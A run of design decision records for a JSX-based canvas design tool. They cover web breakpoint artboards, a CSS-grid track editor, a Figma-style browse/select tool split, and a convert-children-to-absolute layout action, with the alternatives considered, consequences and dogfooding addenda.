- **Advisory-only: `design-system-keeper` Pass A.10 flags unjustified absolute positioning (no preceding JSX comment) as a warning, same severity ladder as Pass A.7's viewport-escape scan** — picked. Matches this codebase's established posture (Pass A.7 already treats a legitimate full-bleed exception as commentable, not blocked) and composes with the existing `/design:new`/`/design:edit` brief-cue + awareness-step layer rather than adding a second enforcement mechanism.

**Breakpoint model:**
- **A new, web-specific preset table with its own numeric ladder** — rejected: `SCREEN_PRESETS` (mobile 390 / tablet 834 / laptop 1280 / desktop 1440) already exists for the "+ Artboard" flow and these ARE standard web breakpoints; a second table with different numbers would just be two sources of truth for the same concept with no benefit (unlike print, which genuinely needed a new mm-based `PAPER_PRESETS` table — physical paper sizes have no px-native representation to reuse).
- **Reuse `SCREEN_PRESETS` verbatim, relabel the picker's option text for `kind="web"` to read as breakpoints ("Mobile — ≤390px breakpoint") instead of exact-box sizes, and commit width-only (not height) since a web artboard hugs** — picked.
- **Desktop-first cascading/linked breakpoints (Framer's model — a mobile variant inherits desktop styles until overridden)** — pros: this is genuinely how professional responsive-design tools work, and the deep-research citation (`framer.com/blog/responsive-breakpoints`) documents it; cons: requires a variant/override data model and sync semantics that don't exist anywhere in this codebase's JSX-is-truth authoring model (DDR-027) — every artboard is a fully independent, self-contained `<DCArtboard>`; retrofitting inheritance would be a foundational change, not a feature. **Rejected for this plan, explicitly** (Design Decision 3) — flagged as a future DDR if real usage demands it.
- **"Duplicate at width…" = a structural COPY, agent (or the clone's own `@container` rules) adapts content afterward** — picked. Consistent with every other duplicate-style affordance in this codebase (`⌘D`/`applyDuplicateElement` is also a plain copy, not a linked instance).

**Duplicate-artboard engine shape:**
- **Extend `applyInsertArtboard`'s template-string-builder to also accept a "clone from source" mode** — rejected: that function builds a deliberately EMPTY artboard from scratch (Stage I4's own contract: "the new artboard must be empty… a clean frame the user fills"); bolting a clone path onto it would violate that contract for its existing callers.
- **Verbatim `source.slice(start, end)` clone with no attribute rewriting, mirroring `applyDuplicateElement`** — rejected as-is: an artboard's `id`/`label`/`width` are real, explicit JSX attributes (unlike `data-cd-id`, which is transpile-stamped and absent from source) — a byte-verbatim clone would collide on `id` immediately.
- **`applyDuplicateArtboard`: verbatim-clone the artboard's full source span, then patch ONLY `id`/`label`/`width` via a small isolated `MagicString` pass over the extracted substring (offsets translated by subtracting the span's own start), splice the patched clone in as the NEXT SIBLING (not appended after the last artboard)** — picked. New id is `${sourceId}-${width}`, de-duplicated against every existing id with a numeric suffix (deterministic + legible, e.g. `landing-390`, rather than a random suffix). Splicing right after the source (not at file-end) means the clone inherits the very next default-grid slot (`synthDefaultGrid`, canvas-lib.tsx, JSX-render-order-indexed) — "positioned beside the source" falls out of the EXISTING default-grid mechanism for free, with no new `patchCanvasMeta` position-writing code needed.

**Grid track editor write path:**
- **A new `/_api/grid-template` (or similar) route with server-side track-list validation** — rejected: `/_api/edit-css`'s generic single-CSS-property writer (`api.ts` `editCss()`) already accepts ANY valid property name against a plain string value (`JSON.stringify`-escaped, 256-char cap) with zero property-specific special-casing — `grid-template-columns: "200px 1fr 100px"` is, to that layer, indistinguishable from any other CSS value. Confirmed via direct code read and a live end-to-end test (`POST /_api/edit-css` with a real `grid-template-columns` value round-tripped to source and re-rendered correctly) — no new server code was needed.
- **A new dedicated undo/write lane for the grid overlay** — rejected: `grid-template-columns`/`grid-template-rows` were simply added to the shell's existing `resizeElement` allowed-prop list (`client/app.jsx`), the SAME lane Stage D (resize) and Stage J (padding/gap) already ride — consistent with how `padding-*`/`gap` were added there for Stage J with "no new write surface."

**Gutter-drag value math (the `fr`/`%`/`auto` problem):**
- **Reimplement the CSS grid-sizing algorithm to compute exact px allocations for `fr` tracks** — rejected: duplicates browser behavior that's already available for free.
- **Read the browser's own RESOLVED track sizes via `getComputedStyle(el).gridTemplateColumns` (which the spec requires browsers to resolve to concrete px, even for `fr`/`auto`/`%` tracks) for GEOMETRY (gutter placement), and re-derive a new AUTHORED value for DRAG math via the ratio `targetResolvedPx / currentResolvedPx` applied to the track's own authored `fr`/`%` value — proportional re-derivation, the same approach a flex-grow-style drag UI uses** — picked. `px`/`em` tracks stay additive (1 world px of drag = 1 authored unit), matching the existing padding/gap drag convention exactly; `auto`/`min-content`/`max-content` tracks are not draggable at all (no numeric value to scrub) and are excluded from the touched set.
- **Shift = symmetric drag semantics** — matched to THIS codebase's own established meaning of "symmetric" (`paddingSideSet`'s Alt: both touched sides become the SAME dragged value, not an inversely-linked splitter) rather than the alternative "gutter-as-resizable-splitter" model some design tools use, for local consistency.

## Decision

We pick: **web artboards are ordinary, independent `<DCArtboard>`s authored flow-first with an advisory (not hard-blocking) drift check; "Duplicate at width…" is a structural copy (never a linked/inherited variant) whose engine clones-then-patches only `id`/`label`/`width` and relies on the EXISTING default-grid placement mechanism for adjacency; the CSS-Grid track editor (Inspector track-list UI + on-canvas gutter drag + cell-placement fields) rides the pre-existing generic `/_api/edit-css` single-property lane with zero new server-side write surface, resolving drag geometry from the browser's own computed track sizes rather than re-deriving CSS grid math.**

- `kind="web"`'s contract (flow-first layout, `fixed` omitted so height hugs, `@container`/`cqw`/`cqh` for in-artboard responsiveness, `vw`/`vh`/`@media` still banned) is documentation + a keeper advisory pass, not new runtime enforcement — the artboard's existing hug-height (`heightFloor`/`ResizeObserver` re-measurement) and container-type:inline-size machinery (both pre-existing, DDR-181/foundation) already do the structural work; this plan's job was making the AUTHORING discipline explicit, not building new rendering machinery.
- The breakpoint-band chip (T2, "≤ Npx") is decorative, always-on chrome (no visibility toggle, unlike print's opt-in bleed/trim/margin overlay) because it's a single small corner label with nothing to visually collide with — the opt-in-toggle precedent exists specifically because print's guides visually cover artboard content.
- `applyDuplicateArtboard` (canvas-edit.ts) and its disk wrapper/API-op/HTTP-route (`/_api/duplicate-artboard`) follow the identical shape every other structural op in this codebase uses: `resolveCanvasAbs` → rate-gate → validate → `activity:suppress` → read `before` → apply → read `after` → best-effort `history.writeSnapshot` → `logUndo` → return `{ok, artboardId, seq}`. Main-origin-only (absent from both the `CANVAS_SAFE_API` allowlist and `startCanvasServer`'s routes map), same DDR-054 trust posture as `/_api/insert-artboard`/`/_api/delete-artboard`.
- The grid gutter-drag overlay (`use-grid-track-handles.tsx`) is gated on computed `display: grid`/`inline-grid` (never on the JSX `kind` — a grid container can exist inside a `digital` artboard too) and coexists with the Stage-D resize-handle overlay on the SAME single-element selection (unlike Stage-J's spacing overlay, which is mutually exclusive with the equal-spacing dots by selection-count, the resize and grid-gutter overlays are BOTH live simultaneously for one selected grid container) — kept non-colliding by z-index tiering (grid gutters at 4, same layer as Stage-J's padding/gap handles, both below Stage-D's frame-edge handles at 5/6) rather than any new hit-test exclusion logic.
- Only tracks AUTHORED inline via `grid-template-columns`/`grid-template-rows` (parseable by `grid-track-handles.ts`'s `parseTrackList` — a plain space-separated list) get on-canvas drag handles; `repeat()`/`minmax()`/a stylesheet-authored grid fall back to the Inspector's raw-text field. This is the same inline-style-only constraint every other curated on-canvas knob in this codebase already has (these tools edit JSX-authored inline styles, never `_components.css` classes).
- On-canvas corner-drag cell-span (the stub's own "manual cell placement… with a corner-drag to span across cells on the canvas" wording) was NOT built — the Inspector's `grid-column`/`grid-row` free-text fields (start/span syntax) cover the same capability without the added 2D hit-testing complexity a resizable span handle would need. Disclosed scope trim, not a silent gap.

## Consequences

**Positive:**
- Zero new server-side write infrastructure for the grid editor — confirmed live (a raw `POST /_api/edit-css` with a `grid-template-columns` value round-tripped correctly to source and re-rendered the grid with new track sizes) before any client UI was even wired, derisking the biggest unknown early.
- "Duplicate at width…"'s adjacency ("beside the source") required no new position-writing code at all — it's an emergent property of splicing the clone next to its source in file order, which the pre-existing render-order-indexed default-grid (`synthDefaultGrid`) already places adjacently.
- The web-kind authoring contract composes with (rather than duplicates) the existing artboard-isolation ban and the existing `design-system-keeper` pass architecture (A.10 slots in alongside A.5–A.9 with the identical severity-ladder conventions).
- 22 new unit tests cover the pure track-parse/serialize/geometry/drag-math module (`grid-track-handles.ts`) independent of any DOM/React harness, plus new integration tests for `applyDuplicateArtboard` (engine) and `/_api/duplicate-artboard` (HTTP round-trip incl. CSRF-rejection + 422-on-unknown-id) and the canvas-origin-gate unreachability assertion.

**Negative / trade-offs:**
- No on-canvas corner-drag cell-span — a user placing a child into a specific grid cell types `grid-column`/`grid-row` values rather than dragging a visual handle. Documented above, not silently missing.
- The gutter-drag's proportional re-derivation for `fr`/`%` tracks is a UI convenience approximation (re-deriving the share ratio from before/after resolved px), not an exact inverse of the CSS grid-sizing algorithm — acceptable for an interactive drag (the value settles to something reasonable and is always further adjustable), flagged here so a future maintainer doesn't mistake an edge-case rounding wobble for a bug.
- `em`-unit track drag is treated as px-equivalent (no font-size-aware conversion) — same simplification this codebase already accepts elsewhere for drag-scrub ergonomics.
- Desktop-first cascading/inherited breakpoints (the Framer model) remain explicitly out of scope — a user who wants that workflow still duplicates + manually adapts each breakpoint today.
- Live verification of the exact on-canvas Cmd+click element-selection + pointer-drag gesture (for the Inspector panel and the grid gutter handles specifically) was not automatable with the available browser-automation tooling in this session (it lacks modifier+mouse-click composition) — verified instead via (a) the pure-math test suite, (b) a live end-to-end write+reflow through the exact same `/_api/edit-css` commit lane the drag overlay uses, and (c) the context-menu-driven "Duplicate at width…" flow (which doesn't require element selection) end-to-end live, including the resulting file diff and on-canvas render. The underlying drag mechanics (pointerdown/rAF/postMessage-commit) are structurally identical to Stage D/J's already-shipped, already-dogfooded overlays.

## Revisit when

- Real usage demands desktop-first cascading breakpoints — needs its own DDR (a variant/inheritance data model is a foundational change, not a feature, per the alternatives section above).
- On-canvas corner-drag cell-span is requested — extend `use-grid-track-handles.tsx` with a second handle class (cell corner, not gutter) rather than forking the module; the pure-geometry split (`grid-track-handles.ts`) already isolates the math a corner-drag would need (per-track resolved sizes → cell bounding box).
- `repeat()`/`minmax()` on-canvas drag support is requested — `parseTrackList`'s current "bail to `[]` on anything unparseable" behavior is deliberately conservative; extending it needs a real track-function parser, not a regex tweak.
- The live Cmd+click + pointer-drag gesture needs automated regression coverage — route through the `desktop-e2e` (WebdriverIO) harness (real OS-level input, not CDP synthetic events) rather than `agent-browser`, which this session confirmed lacks modifier+mouse-click composition.

## Linked
- Plan: `.ai/plans/feature-3-web-artboards.md`
- PRD: —
- Supersedes: —
- Absorbs: `feature-grid-track-editor.md` (stub, archived — see plan's T5/T7)
- Builds on: [DDR-181](./DDR-181-artboard-kind-model-and-overlay-layer-contract.md) (artboard `kind` + overlay registry), [DDR-182](./DDR-182-print-artboards-bleed-model-and-pdf-post-pass.md) (sibling kind-family plan — the "single-source-of-truth prop, re-read independently by every consumer" pattern this DDR's breakpoint-chip decision also follows)

decision.title: Figma smart-select — browse/move tool split, boot=alive, and the promoted pass-through invariant
decision.rationale:
# DDR-187: Figma smart-select — browse/move tool split, boot=alive, and the promoted pass-through invariant

**Status:** Accepted
**Date:** 2026-07-18
**Tags:** input-router, tool-mode, canvas, selection, figma-parity, ux, posture

## Context

The canvas's `move` tool was overloaded. Its bare left-click was a **pure native pass-through** (so a mock's buttons/links/inputs stayed alive) and selection fired **only** on Cmd/Ctrl+click, always resolving to the *deepest* element. Two problems:

1. The Figma muscle-memory gesture — a *plain* click selects the object under the cursor — did nothing. The user's words: Cmd+click *"už mi přijde zbytečný"* (now feels pointless).
2. The pass-through-vs-select contract was enforced only by a code comment (`input-router.tsx`), not a test — a silent-regression risk for every native-input surface (photo editor, video timeline, whiteboard, live prototype buttons).

The design fork that needed a human call: **what is the boot posture?** Boot into a Figma-literal *select* tool (plain click selects; you'd need a separate "Interact/Preview" mode + a peek gesture to click a live button), or keep the canvas **alive** by default and arrive at select only when the user asks for it?

## Alternatives considered

**Where does selection live (tool vs. artboard-kind)?**
- **Key selection behavior off the artboard `kind`** (e.g. `web` artboards select-first, others alive) — rejected in the `/flow:plan` debate: kinds coexist on one canvas, so this creates an invisible positional mode and a hot-path kind lookup on every click. Selection must be **TOOL-based**, never kind-keyed.

**Boot posture (the surfaced fork, user-decided 2026-07-15):**
- **A. Boot into `select` (Figma-literal).** Plain click selects from the first frame. Pros: the Figma gesture works instantly with no tool switch. Cons: **regresses every native-input surface** — a freshly opened mock is dead (buttons don't click) until the user finds an "Interact" mode; needs net-new Interact-mode + quick-peek + first-run machinery to undo that regression. All three debate seats rated this the higher-risk path.
- **B. Boot into `browse` (alive), press V for select.** Picked, unanimously (3/3 seats) and confirmed by the user. Zero regression for existing canvases and every native-input surface — they behave byte-identically to today's boot. Figma muscle memory arrives the instant **V** is pressed. Residual discoverability risk (a user may not know to press V) is mitigated with a visible palette affordance + a one-time "press V to select & edit" first-run hint + a What's New entry — cheap, reversible additions, not a structural mode.

**Decomposition — how to split without churning the gate wiring:**
- **Rewire every `tool === 'move'` gate to a new predicate** — rejected: the marquee overlays, in-canvas drag-to-reorder, resize/spacing/grid-track handles, and artboard-drag are ALL gated on `tool === 'move'`; touching them is the blast radius.
- **Additive split: `browse` is a NEW tool carrying ZERO select machinery; `move` KEEPS every existing gate untouched and only its bare-click branch flips** — picked. `browse` returns `no-op` for every pointer event (the router never claims → native events flow), so all the move-gated machinery is inert in `browse` *by construction*, with no rewires. The entire behavioral change is contained to `classify()` + the tool registry + the boot default.

## Decision

1. **New `browse` tool = the boot default.** Pure native pass-through: `classify()` returns `no-op` for every browse pointer event, so the router claims nothing and the mock stays alive (buttons click, links follow, inputs focus). No hover halo, no select — not even a Cmd escape-hatch (unlike the draw tools). The cursor is the system `default` over chrome and native element cursors over the mock (the `* { cursor: … !important }` forcing is special-cased off for browse, both in-iframe and in the shell). `ToolProvider` `initial='browse'`.
2. **`move` becomes the SELECT tool (V), with the full Figma ladder:** bare click = TOP-level object (`deep:false`, replace), Shift = add-top, Cmd/Ctrl = DEEPEST element (`deep:true`, replace), Cmd+Shift = add-deep. Bare hover paints a top-level preview halo. All left clicks in `move` are claimed (native suppressed) — selecting a button doesn't press it. The existing double-click drill-in (Task L6) and Enter/Shift+Enter/Tab keyboard ladder (Task L2) already matched Figma; both are hardened to be inert in `browse` (the mock owns its own dblclicks + keyboard in alive mode). Esc = deselect only (unchanged, router-owned).
3. **No gate rewires.** Every `tool === 'move'` gate (marquee overlays, ReorderDrag, resize/spacing/grid-track/artboard-drag hooks) is untouched and inert in `browse`.
4. **The pass-through invariant is promoted from comment to test.** `browse-posture.test.tsx` (happy-dom + a real `createRoot`) proves a bare click in `browse` fires the native handler and dispatches no select, while `move` claims it and suppresses the native handler; `input-router.test.ts` adds a "browse pure pass-through" table + a "select never leaks into a non-select tool" guard. This is the canvas-origin-gate equivalent for the input posture — the load-bearing regression fence.
5. **No spacebar peek.** Space stays pan. A dedicated peek key was left unbound (the boot=alive posture makes a peek-from-select gesture non-essential); if it's ever needed, pick a non-colliding key with an explicit audit (snap-Alt, measure-Alt-hover, Cmd-suppress-snap).

## Consequences

- Existing canvases behave identically on boot (still alive). The only observable change is the boot tool label and that **V** now yields the Figma select gesture instead of Cmd-only-deep.
- The `RouterAction.select.deep` field's meaning widened: it is now driven by the modifier (`deep = metaOrCtrl`) rather than being hardwired `true`. The shell's `onSelect` already honored `deep`.
- Layers-panel keyboard traversal + inline text-edit are now scoped OUT of `browse` — a lingering selection carried into the alive mode no longer hijacks Enter/Delete/dblclick from the mock.
- Discoverability rests on a first-run hint (localStorage `maude-browse-hint-seen`) + the palette; if telemetry ever shows users stuck in browse, a louder affordance is the follow-up, not a posture change.

## Scope note

The plan (`feature-4-canvas-editing-figma-parity.md`) paired this selection model with an incremental Figma-grade **layers** upgrade and a **convert-to-absolute** context action (its own DDR-188). The first session shipped the selection model in full plus the layers panel's synthetic-group-rows fix + auto-reveal; a follow-up session (2026-07-19) completed the remainder — **component-instance rows** (purple ◆/◇ from a new read-only `/_api/component-map` parse; the "instance" signal is *the enclosing component is instantiated as JSX in this file*, which correctly excludes the top-level canvas component), **locked layers** (a third per-user view.json lane `locked: ["<cdId>:<idx>"]` beside viewport/overlays — REPLACE semantics so unlock works; canvas-side enforcement refuses select/drag on a locked element while the Layers row stays reachable to unlock), and **inline rename** (dblclick a row label → writes `data-dc-element` through the existing `/_api/edit-attr` + undo lane; `layerLabel` already read it as top priority). One live-dogfood correction: engine chrome wrappers (`dc-*`/`dgn-*`) are hoisted, not emitted as synthetic groups — without this every artboard grew a phantom "dc-artboard-body GROUP" root row.

The full posture + layers + convert contract was **verified live** (agent-browser against a source dev-server, 2026-07-19): browse boot → real button click fires; V → bare click claims + selects the top-level object; Esc deselects; lock persists + enforces on canvas; rename round-trips source→HMR→tree; convert produces a zero-visual-delta rewrite; `/design:smoke` 69/69 canvases styled.

## Addendum (2026-07-19/20) — first-dogfood corrections

The user's first hands-on round surfaced five real defects + one decision reversal; all landed the same day:

1. **Selection echo overwrote fresh state** ("multiselect snaps back to one element", "drill snaps back to the parent"). Root cause: the shell's WS `'selected'` broadcast is also the ECHO of its own `wsSend('select')` — it round-trips the server and lands hundreds of ms later, overwriting a meanwhile-drilled/multi-selected state and re-imposing it via the halo-restore ladder. Fix: a 2 s suppression window after any LOCAL selection send (`lastLocalSelectAtRef`) — a genuine cross-canvas restore never follows a local select that closely.
2. **Camera yanked back to the selection while panning away.** The halo-restore/artboard-resync ladders re-post `select-by-id` at 50…5000 ms, and every application re-ran the camera reveal. Fix: an IDEMPOTENT re-select (same id/index) no longer reveals — only a selection *change* pans.
3. **Cmd+click in Browse is now the escape hatch** (reverses this DDR's original "no escape hatch" decision, on explicit user steer: "I clicked to edit" shouldn't require pressing V first). It selects the deepest element AND flips the tool to Move; Cmd-hover previews. Bare/Shift clicks stay pure pass-through — the posture invariant holds where it matters.
4. **Layers panel required a selection to populate.** The shell now requests the tree for the viewport-active artboard on canvas/artboard change (debounced), and the panel renders the tree with no selection — Layers work in Browse.
5. **The dblclick drill ladder couldn't actually descend.** Two compounding causes: (a) a dblclick's own `pointerdown(detail:2)` re-selected the TOP-level object right before the drill ran — fixed with Figma's "entered group" context (a bare top-mode click INSIDE the current selection keeps it); (b) a dblclick on LEAF TEXT jumped straight to the inline editor from any depth — now Figma-exact: each dblclick drills one level, and the editor opens only when the leaf itself is already selected. The desktop e2e migrated to a `synthDblclickUntil` helper accordingly.

The `window.confirm`-in-sandbox finding (canvas iframe has no `allow-modals`; confirm silently returns `false`) is recorded in DDR-188's second addendum — it was the root cause of "convert nic nedělá".

decision.title: Convert children to absolute position — reversing a documented non-goal, one batch write, plain-children-only
decision.rationale:
# DDR-188: Convert children to absolute position — reversing a documented non-goal, one batch write, plain-children-only

**Status:** Accepted
**Date:** 2026-07-18
**Tags:** canvas-edit, convert-to-absolute, ast-write, layout, undo, figma-parity, ddr-054

## Context

When a generated flex/grid layout fights a designer's manual tweaks, there was no way to flatten it: the reposition/nudge/align lanes all gate on an element ALREADY being out-of-flow (`position:absolute|fixed`), and two code comments (`contextual-toolbar.tsx`, `use-element-resize.tsx`) explicitly recorded "never convert-to-absolute" as a deliberate non-goal — the codebase's stance was that an implicit convert-on-drag would surprise users and fight the JSX-is-truth model (DDR-027).

The user asked for Figma's "Remove auto layout": right-click a container → freeze its children's computed boxes → rewrite them to `position:absolute` so they can be dragged freely. This DDR reverses the non-goal — but deliberately, as an EXPLICIT opt-in action, not the implicit on-drag conversion the original comments warned against (that stays a non-goal).

## Alternatives considered

**Write path — N calls vs one batch:**
- **N sequential `/_api/edit-css` calls** (one per property per child + the container) — rejected: each is a separate source write + HMR reload + its OWN undo `seq`, so Cmd+Z would unwind one property at a time (dozens of steps to undo one convert) and the canvas would flicker through N intermediate states. The plan's "one whole-file snapshot undo record" is the whole point.
- **One batch AST write over a single parse** — picked. New pure `applyConvertToAbsolute(path, source, spec)` (canvas-edit.ts) parses once and applies every child's `position/left/top/width/height/box-sizing` + the container's `position:relative` to ONE `MagicString`, returning the new source. The async `convertToAbsolute` wrapper writes atomically under the per-file lock; `convertChildrenToAbsoluteOp` (api.ts) snapshots before/after and emits a single `logUndo` `seq`. This rides the EXISTING Stage-I whole-file undo lane (DDR-138) verbatim — the shell's `structuralWrite` relays `record-edit(op:'reorder', seq)` and one Cmd+Z reverts the entire operation via `/_api/reorder-revert`. Zero new undo machinery.

**The multi-property-per-element writer:**
- **Reuse `editStyleProp` N× per child** — rejected: it re-reads the ORIGINAL AST each call, so on a style-less element the 2nd..6th calls each re-insert a fresh `style={{…}}`, producing duplicate attributes. New `setMultipleStyleProps` handles the no-style case with a single combined insert and delegates the existing-style case per-prop (distinct keys → non-overlapping edits; new-key appends stack correctly). A regression test asserts exactly one `style={{` per element.

**Shared / repeated children — confirm vs abort:**
- **Route shared-component children through an "affects N instances" confirm dialog** (the plan's original idea) — the Stage-H "shared instance" surface turned out to be a passive Inspector BADGE, not a blocking modal; there is no confirm-dialog primitive to reuse. Building one was out of scope.
- **Plain-children-only, honest abort for the rest** — picked. The canvas iframe pre-filters: it refuses (all-or-nothing, with a clear toast) if ANY direct child is unstamped, or if any child/container `data-cd-id` appears more than once in the artboard (a `.map()`ed list or a shared-component instance — one source element can't hold N distinct absolute positions). The AST writer's `resolveUsageId` guard is the server-side backstop: a child whose `idIndex` resolves to a different `<Component/>` usage throws. This is a correct SUBSET, not a workaround — converting repeated/mapped content to absolute is genuinely ill-defined; refusing it is the right behavior, and it covers the stated use case (hand-authored flex heroes) cleanly. The "affects N instances" confirm for true component instances is a deferred follow-up.

**Box fidelity (zero visual delta):**
- Measured client-side: each child's border-box in WORLD units (`getBoundingClientRect` is post-zoom screen px, divided by `worldZoomFor`; computed border widths are unscaled world px). `left`/`top` are measured from the container's PADDING edge (where CSS absolute positioning originates); `width`/`height` are the border-box, and we also write `box-sizing:border-box` so the outer rectangle is preserved regardless of the child's own box model (inner content may reflow within an unchanged box — Figma-consistent). The container becomes `position:relative` only when it's currently `static`.

## Decision

Ship an explicit context-menu action "Convert children to absolute position", container-gated (`hidden` unless the element has stamped direct children). It measures each direct stamped child's frozen border-box (world units, padding-relative) in the canvas, posts a `convert-to-absolute-request` up to the main-origin shell (DDR-054 — canvas requests, shell writes), which calls the new main-origin-only `/_api/convert-to-absolute` route → `convertChildrenToAbsoluteOp` → `convertToAbsolute` → one `MagicString` pass → one `logUndo` seq. Plain, globally-unique children only; unstamped / repeated / component-instance children abort with a clear message. The two non-goal comments are updated to point here: the IMPLICIT convert-on-drag remains a non-goal; this EXPLICIT action is the opt-in flatten path.

## Consequences

- One atomic Cmd+Z reverts a whole convert (rides the existing DDR-138 lane).
- After converting, the flow layout is flattened: children can be dragged/nudged/aligned freely (they're now out-of-flow, satisfying every reposition-lane gate). Grid-track editing (web plan) no longer applies to converted children — surfaced as a toast when the container was a grid.
- A "convert back to flow" is intentionally NOT offered (undo is the reversal — the operation is one-way by design).
- Security posture: the route is main-origin-only (absent from `CANVAS_SAFE_API` + `startCanvasServer`), `sameOriginWrite` + loopback-Host gated, rate-limited via `takeStructuralToken`, every numeric field bounded (|v| ≤ 1e6), children capped at 500, ids validated against `CD_ID_RE` — identical to the other structural write ops.

## Addendum (2026-07-19) — the component-instance confirm shipped

The originally-deferred "affects N instances" path landed in the follow-up session: when any direct child's `data-cd-id` repeats in the artboard, the canvas asks a `window.confirm` (the shell-side count is client-computable — no extra parse round-trip) and, on yes, sends `allowShared: true` + a per-child `idIndex` (DOM occurrence). Server-side, `resolveUsageId` routes each such child's write to its own `<Component/>` **usage** tag (the Stage-H3 local-instance model — position stays local to the instance; the shared definition is untouched; the component must forward `style` to paint, the same assumption whole-instance drag-reposition makes). A `.map()`ed child still refuses regardless — detected as two children resolving to the SAME target element ("repeated source element"), which is the one shape that genuinely cannot hold N absolute positions. Covered by two new unit cases (per-usage boxes; `.map` refusal). **Verified live end-to-end** (2026-07-19): context-menu gating, frozen-box payload, one-seq write, zero visual delta after HMR.

## Addendum 2 (2026-07-19/20) — "convert nic nedělá": sandboxed confirm, visible feedback, artboard-level convert

**Root cause of the user's "convert does nothing":** the canvas iframe runs with `sandbox="allow-scripts allow-same-origin"` (no `allow-modals`), so the T8b `window.confirm()` **silently returned `false`** — any container with repeated children (component instances are everywhere in real canvases) aborted invisibly. Compounding it, a SUCCESSFUL convert is zero-visual-delta *by design*, and server refusals only went to `console.warn` — success and failure both looked like "nothing happened."

Fixes:
1. **`canvasConfirm()`** (use-canvas-media-drop.tsx) — a sandbox-safe promise-based in-canvas dialog (overlay + two buttons, Esc/backdrop/Enter). Replaces every `window.confirm` on the canvas surface.
2. **Visible outcome, both ways** — the shell's `structuralWrite` now posts a `dgn:'op-toast'` down: success = "Converted N elements to absolute — press V and drag them freely (⌘Z to undo)"; failure = the server's actual refusal text (e.g. the `.map` message).
3. The shell hop itself was **verified end-to-end** via a forged `MessageEvent` (real `source: iframe.contentWindow`, so the DDR-054 confused-deputy gate ran for real): handler → `/_api/convert-to-absolute` → one-pass source rewrite + seq.

**Artboard-level convert (user steer: "convert vše na absolute" for marketing graphics).** `applyConvertToAbsolute` now accepts a `containers[]` batch — the whole artboard's stamped-container tree flattened to absolute in ONE pass / ONE undo seq. The root level (`.dc-artboard-body`, already `position:relative` engine chrome with no cd-id) takes children boxes with no container write; an element that is both a converted child and a container gets exactly ONE `position` key (absolute wins — it is itself a positioning context). Client walk is recursive top-down (canvas-shell `postConvertArtboardToAbsolute`). Reachable from (a) the artboard context menu ("Convert layout to absolute…") and (b) a `canvasConfirm` offer when switching an artboard's kind to **Digital or Print** ("Switch + freeze" / "Just switch") — those two kinds are the freely-composed marketing surfaces; `web` stays flow-first. Deliberately NOT a literal reparent-flatten of the JSX tree: moving subtrees out of their parents would break scoped styles, component boundaries, and `.map`s — recursive per-container freezing gives the same "drag anything anywhere" outcome (children ride with their parent, Figma-group-like) without destroying the document structure.

**Detach component** (same session, user request): `applyDetachComponent` clones the component's definition under a fresh name (`CardDetached`, `CardDetached2`, …) and repoints ONE usage at the clone — behavior-preserving for ANY component (props/children flow unchanged; no substitution heuristics), and subsequent edits resolve LOCAL. Surfaced as a "Detach" button on the Inspector's Shared scope badge (`/_api/detach-component`, whole-file undo seq). This — together with the existing Stage-H3 usage-level box writes — is the answer to "an absolute child inside a reused component moved in every artboard": per-instance BOXES go on the usage tag; anything deeper, detach first.

Authoring guidance landed in the design plugin (`new.md` marketing-graphic brief cue + `edit.md` §0.9 absolute-layout awareness): digital/print marketing compositions author absolute-first; per-instance positions go on usage tags; never "normalize" an absolute layout back into flow.

## Addendum 3 (2026-07-20) — authored ids, component wrapping, TRUE flatten

Second dogfood round root-caused three more:

1. **"Convert failed: invalid container data-cd-id"** — the container was `data-cd-id="wal-hero-nav"`, a HAND-AUTHORED id. The pipeline preserves authored ids (skips injection), so the DOM carries the authored string while the positional hash never exists — yet `findOpening`/`collectElements*` matched only the computed hash, and `CD_ID_RE` (8-hex) rejected the shape. This made authored-id elements unreachable by the ENTIRE edit engine, not just convert. Fixed globally: every AST walker now prefers the authored literal (`authoredCdId()`), and `CD_ID_RE` widened to `[\w-]{1,64}` (the walkers do exact matching — the regex is only a shape gate). `LOCKED_KEY_RE` widened to match. Verified live on the user's own canvas: the exact failing header converted + reverted byte-exact via the undo lane.
2. **Component instances piled at the artboard's top-left after convert** — writing `style` on a `<Component/>` usage tag only works when the component forwards it; most don't. Instance children are now **WRAPPED** in a positioned `<div style={{position:absolute,…}}>` instead — correct for ANY component, zero forwarding assumptions. (MagicString gotcha: at the shared boundary between ADJACENT usages, the open must `appendRight` and the close `appendLeft`, or the second wrapper opens before the first closes.) Verified live: card rects byte-identical before/after the artboard flatten.
3. **TRUE FLATTEN shipped** (the user's explicit repeat ask — "zploštit tree"): the artboard-level convert now DISSOLVES unstyled layout wrappers (no background/border/shadow/radius/clip/opacity/filter/transform, unique id) — their opening+closing tags are removed from the JSX and children hoist to the nearest SURVIVING ancestor, measured against it. Styled containers survive as frozen groups. Server: `dissolve[]` on the batch spec (style/dissolve target sets disjoint by hard error). The kind-switch offer now runs from BOTH entry points — the canvas context menu (in-canvas `canvasConfirm`) AND the Inspector's kind picker (shell `window.confirm` → `dgn:'freeze-and-set-kind'` → the CANVAS orchestrates convert-then-kind in order, so a print resize can't move anything before it's frozen).

Also this round (DDR-187 side): the text-edit gesture ladder — dblclick entry SELECT-ALL (Figma), in-edit native gestures (router bails on editable targets: click=caret, dblclick=word, triple=all), and a Text-tool hover outline on the editable leaf it would edit.
